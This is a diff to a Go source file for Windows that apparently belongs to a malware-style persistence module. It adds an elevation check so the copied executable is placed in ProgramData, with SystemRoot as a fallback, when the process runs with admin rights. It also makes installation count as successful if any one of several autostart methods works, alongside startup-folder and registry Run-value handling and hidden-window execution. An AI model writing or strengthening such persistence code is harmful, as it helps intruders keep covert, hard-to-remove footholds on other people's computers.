@@ -15,6 +15,7 @@ import (
 	"strings"
 	"syscall"
 
+	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
 )
 
@@ -32,6 +33,11 @@ const (
 
 	createNoWindow = 0x08000000
 )
+
+func isElevated() bool {
+	token := windows.GetCurrentProcessToken()
+	return token.IsElevated()
+}
 
 func hasCustomName() bool {
 	return DefaultStartupName != ""
@@ -85,11 +91,23 @@ func getStartupFolderTargetPath() (string, error) {
 }
 
 func getAppDataTargetPath() (string, error) {
-	appDataDir := os.Getenv("APPDATA")
-	if appDataDir == "" {
-		return "", fmt.Errorf("APPDATA environment variable not set")
+	baseDir := os.Getenv("APPDATA")
+	// If running elevated or as SYSTEM, prefer ProgramData or SystemRoot
+	if isElevated() {
+		if progData := os.Getenv("ProgramData"); progData != "" {
+			baseDir = progData
+		}
 	}
-	dir := filepath.Join(appDataDir, appDataBinaryDir)
+	if baseDir == "" {
+		if progData := os.Getenv("ProgramData"); progData != "" {
+			baseDir = progData
+		} else if sysRoot := os.Getenv("SystemRoot"); sysRoot != "" {
+			baseDir = sysRoot
+		} else {
+			return "", fmt.Errorf("no suitable base directory for persistence target")
+		}
+	}
+	dir := filepath.Join(baseDir, appDataBinaryDir)
 	if existing, ok := findExistingBinaryInDir(dir); ok {
 		return existing, nil
 	}
@@ -203,13 +221,23 @@ func install(exePath string) error {
 		_ = cleanupLegacyRunValues()
 		return nil
 	}
-	var firstErr error
+	var (
+		firstErr    error
+		successCount int
+	)
 	for _, fn := range persistInstallFns {
-		if err := fn(exePath); err != nil && firstErr == nil {
-			firstErr = err
+		if err := fn(exePath); err != nil {
+			if firstErr == nil {
+				firstErr = err
+			}
+		} else {
+			successCount++
 		}
 	}
 	_ = cleanupLegacyRunValues()
+	if successCount > 0 {
+		return nil
+	}
 	return firstErr
 }
 
